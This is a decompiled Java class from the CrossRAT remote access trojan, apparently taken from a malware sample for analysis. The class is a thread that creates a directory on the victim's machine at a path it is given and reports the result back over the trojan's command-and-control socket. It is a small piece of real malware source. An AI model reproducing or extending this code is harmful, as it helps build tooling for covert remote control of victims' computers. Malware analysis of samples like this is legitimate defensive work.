package crossrat;

import java.io.DataOutputStream;
import java.io.File;
import java.net.Socket;

final class a
  extends Thread
{
  private String a;
  private String b = null;
  
  public a(String paramString)
  {
    this.a = paramString;
  }
  
  public final void run()
  {
    File localFile = new File(this.a);
    DataOutputStream localDataOutputStream = null;
    try
    {
      localDataOutputStream = new DataOutputStream(k.k.getOutputStream());
    }
    catch (Exception localException3)
    {
      Exception localException1;
      (localException1 = localException3).printStackTrace();
    }
    if (!localFile.exists())
    {
      int i;
      try
      {
        localFile.mkdir();
        i = 1;
      }
      catch (SecurityException localSecurityException)
      {
        i = 0;
        this.b = "0";
      }
      if (i != 0) {
        this.b = "1";
      }
    }
    else
    {
      this.b = "2";
    }
    try
    {
      localDataOutputStream.writeBytes(k.g + k.d + k.D + k.d + this.b + k.d + "&&&");
      return;
    }
    catch (Exception localException4)
    {
      Exception localException2;
      (localException2 = localException4).printStackTrace();
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */